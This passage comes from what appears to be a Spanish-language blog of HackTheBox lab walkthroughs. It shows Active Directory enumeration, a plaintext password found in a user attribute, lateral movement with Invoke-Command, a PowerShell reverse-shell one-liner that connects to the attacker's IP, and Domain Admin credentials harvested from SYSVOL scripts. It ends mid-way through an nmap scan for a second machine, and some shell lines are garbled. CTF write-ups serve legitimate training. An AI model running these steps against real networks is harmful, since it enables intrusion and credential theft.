logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : <span class="nv">CN</span><span class="o">=</span>ldap,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
lastlogontimestamp    : 6/15/2024 12:56:14 AM
name                  : ldap
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1103
samaccountname        : ldap
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 6/15/2024 7:56:14 AM
instancetype          : 4
usncreated            : 12595
objectguid            : cc068896-96ca-4bdd-a6e9-cea49d58c6ec
sn                    : user
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : ldap
c                     : UK
lastlogon             : 6/15/2024 12:56:14 AM
streetaddress         : unknown
badpwdcount           : 0
cn                    : ldap
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:27 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:27 AM
usnchanged            : 24668
postalcode            : 12345

company               : fulcrum
logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : <span class="nv">CN</span><span class="o">=</span>923a,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
name                  : 923a
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1104
samaccountname        : 923a
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/8/2022 7:10:32 AM
instancetype          : 4
usncreated            : 12610
objectguid            : 8ea0a902-110d-46ec-98b4-825d392c687c
sn                    : 923a
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata : <span class="o">{</span>5/8/2022 7:10:32 AM, 1/1/1601 12:00:00 AM<span class="o">}</span>
givenname             : 923a
c                     : UK
memberof              : <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>lastlogon             : 12/31/1600 4:00:00 PM
streetaddress         : unknown
badpwdcount           : 0
cn                    : 923a
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:38 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:38 AM
usnchanged            : 12813
postalcode            : 12345

company               : fulcrum
logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : <span class="nv">CN</span><span class="o">=</span>BTables,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
lastlogontimestamp    : 5/9/2022 7:48:46 AM
name                  : BTables
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1105
samaccountname        : BTables
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/9/2022 2:48:46 PM
instancetype          : 4
usncreated            : 12628
objectguid            : 8e5db1d3-d28c-4aa1-b49d-f5f8216959fe
sn                    : BTables
info                  : Password <span class="nb">set </span>to ++FileServerLogon12345++
objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : BTables
c                     : UK
lastlogon             : 5/9/2022 7:48:46 AM
streetaddress         : unknown
badpwdcount           : 0
cn                    : BTables
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:49 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:49 AM
usnchanged            : 16404
lastlogoff            : 12/31/1600 4:00:00 PM
postalcode            : 12345
</code></pre></div></div>

<ul>
  <li>Si filtramos directo por la info de los usuarios vemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">BTables</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainUser <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-DomainController</span> dc.fulcrum.local | Select Name,Info

name          Info
<span class="nt">----</span>          <span class="nt">----</span>
Administrator
Guest
krbtgt
ldap
923a
BTables       Password <span class="nb">set </span>to ++FileServerLogon12345++
</code></pre></div></div>

<ul>
  <li>Este usuario es administrador del dominio si lo pwneamos tendremos privilegios máximos a nivel de dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainUser <span class="nt">-Credential</span> <span class="nv">$Cred</span> 923a


company               : fulcrum
logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : <span class="nv">CN</span><span class="o">=</span>923a,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
name                  : 923a
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1104
samaccountname        : 923a
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/8/2022 7:10:32 AM
instancetype          : 4
usncreated            : 12610
objectguid            : 8ea0a902-110d-46ec-98b4-825d392c687c
sn                    : 923a
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata : <span class="o">{</span>5/8/2022 7:10:32 AM, 1/1/1601 12:00:00 AM<span class="o">}</span>
givenname             : 923a
c                     : UK
memberof              : <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>lastlogon             : 12/31/1600 4:00:00 PM
streetaddress         : unknown
badpwdcount           : 0
cn                    : 923a
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:38 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:38 AM
usnchanged            : 12813
postalcode            : 12345
</code></pre></div></div>

<ul>
  <li>Vemos que solo hay 2 equipos mas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainComputer <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-DomainController</span> dc.fulcrum.local | Select DNSHostname

dnshostname
<span class="nt">-----------</span>
DC.fulcrum.local
FILE.fulcrum.local
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">Invoke-Command</code> para ejecutar comandos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'++FileServerLogon12345++'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'fulcrum.local\BTables'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Podemos ejecutar comandos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Invoke-Command <span class="nt">-ComputerName</span> file.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
fulcrum<span class="se">\b</span>tables
</code></pre></div></div>

<ul>
  <li>Podemos ver si tenemos conectividad con el puerto <strong>53</strong> <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-7.4">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-7.4</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Invoke-Command <span class="nt">-ComputerName</span> file.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> Test-NetConnection <span class="nt">-ComputerName</span> 10.10.14.62 <span class="nt">-Port</span> 53 <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Y bueno recibimos la conexión.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 53
listening on <span class="o">[</span>any] 53 ...
connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.62] 49737
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos mandarnos una reverse shell <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1</a>.</p>
  </li>
  <li>
    <p>Nos ponemos en escucha.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 53
listening on <span class="o">[</span>any] 53 ...
</code></pre></div></div>

<ul>
  <li>Y enviamos la reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Invoke-Command <span class="nt">-ComputerName</span> file.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.14.62'</span>,53<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte[]]<span class="err">$</span>
s.Length<span class="o">))</span>
ng<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;&amp;1 | Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span>  <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">'PS '</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::A
.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span> <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 53
listening on <span class="o">[</span>any] 53 ...
connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.62] 49738

PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>fulcrum<span class="se">\b</span>tables
PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
fce52521c8f872b514f037fada78daf4
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>Vamos a enumerar por smb desde la powershell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; net use <span class="se">\\</span>dc.fulcrum.local /user:fulcrum.local<span class="se">\B</span>Tables ++FileServerLogon12345++
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; net view <span class="se">\\</span>dc.fulcrum.local /all
Shared resources at <span class="se">\\</span>dc.fulcrum.local



Share name  Type  Used as  Comment

<span class="nt">-------------------------------------------------------------------------------</span>
ADMIN<span class="nv">$ </span>     Disk           Remote Admin
C<span class="nv">$ </span>         Disk           Default share
IPC<span class="nv">$ </span>       IPC   <span class="o">(</span>UNC<span class="o">)</span>    Remote IPC
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Vamos a enumerar <code class="language-plaintext highlighter-rouge">SYSVOL</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL


    Directory: <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL


Mode                LastWriteTime         Length Name                                                                                                                                                                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                                                                                                                   
d----l         5/7/2022  11:52 PM                fulcrum.local  
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local


    Directory: <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local


Mode                LastWriteTime         Length Name                                                                                                                                                                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                                                                                                                   
d-----         5/7/2022  11:52 PM                Policies                                                                                                                                                               
d-----         5/7/2022  11:52 PM                scripts    
</code></pre></div></div>

<ul>
  <li>Este script reporta demasiados .ps1</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts
</code></pre></div></div>

<ul>
  <li>
    <p>Los scripts contienen credenciales de usuarios del dominio si recordamos hay un usuario el cual es parte de <code class="language-plaintext highlighter-rouge">Domain Admins</code> que es <code class="language-plaintext highlighter-rouge">923a</code>.</p>
  </li>
  <li>
    <p>Si filtramos por ese usuario como string en todos los archivos encontramos sus credenciales.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; Select-String <span class="s1">'923a'</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts<span class="se">\*</span>

<span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts<span class="se">\3</span>807dacb-db2a-4627-b2a3-123d048590e7.ps1:3:<span class="nv">$Pass</span> <span class="o">=</span> <span class="s1">'@fulcrum_df0923a7ca40_$'</span> | ConvertTo-SecureString <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts<span class="se">\a</span>1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1:2:<span class="nv">$User</span> <span class="o">=</span> <span class="s1">'923a'</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos ejecutar comandos como ese usuario directamente o usar <code class="language-plaintext highlighter-rouge">evil-winrm</code> pero para eso necesitamos usar chisel.</p>
  </li>
  <li>
    <p>Como el usuario es parte de Domain Admin puedes leer la root flag directamente.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nv">$password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'@fulcrum_bf392748ef4e_$'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'FULCRUM\923a'</span>, <span class="nv">$password</span><span class="o">)</span>
PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; Invoke-Command <span class="nt">-ComputerName</span> dc.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
fulcrum<span class="se">\9</span>23a
</code></pre></div></div>

<ul>
  <li>Vemos la root flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; Invoke-Command <span class="nt">-ComputerName</span> dc.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt <span class="o">}</span>
8ddbe372e57c019bb6c4cdb5b35a0cab
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Analysis (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/06/07/analysis.html" rel="alternate" type="text/html" title="HackTheBox - Analysis (hard)" /><published>2024-06-07T00:00:00-06:00</published><updated>2024-06-07T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/06/07/analysis</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/06/07/analysis.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/c31f19a4d6a3be17987a3ef98e2446a5.png" />
</p>

<ul>
  <li>Analysis is a hard-difficulty Windows machine, featuring various vulnerabilities, focused on web applications, Active Directory (AD) privileges and process manipulation. Initially, an LDAP Injection vulnerability provides us with credentials to authenticate on a protected web application. Through this application, access to the local system is obtained by gaining command execution through an HTA file upload. On the target system, credentials for another user are found in the web application&amp;#039;s log files. Subsequently, by implementing an API Hook on <code class="language-plaintext highlighter-rouge">BCTextEncoder</code>, an encrypted password is decrypted and used to pivot to another user. Finally, by changing the password of an account that has <code class="language-plaintext highlighter-rouge">DCSync</code> rights against the domain, administrative access to the domain controller is obtained.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong> y viendo sus tecnologías.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001,49664,49665,49666,49667,49671,49674,49675,49676,49677,49682,49739 10.10.11.250 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-06 13:27 CST
Nmap scan report <span class="k">for </span>10.10.11.250
Host is up <span class="o">(</span>0.087s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-06-06 19:27:54Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: analysis.htb0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: analysis.htb0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, X11Probe, afp:
|     Invalid message<span class="s2">"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"</span>
|     HY000
|   oracle-tns:
|     Invalid message-frame.<span class="s2">"
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=6/6%Time=66620DC0%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\</span>
SF:0<span class="se">\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HTTPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")
SF:%r(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0</span>
SF:<span class="se">\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSVersionBindReqTCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05
SF:<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestTCP,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0</span>
SF:<span class="se">\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>
SF:05HY000<span class="s2">")%r(TerminalServerCookie,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(Ke
SF:rberos,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(SMBProgNeg,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b
SF:<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(X11Probe,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\</span>
SF:x01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000")%r(FourOhFou
SF:rRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\
SF:0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(LDA
SF:PBindReq,46,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\x</span>009<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'
SF:\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20message\"\x05HY000
SF:")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\
SF:0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0
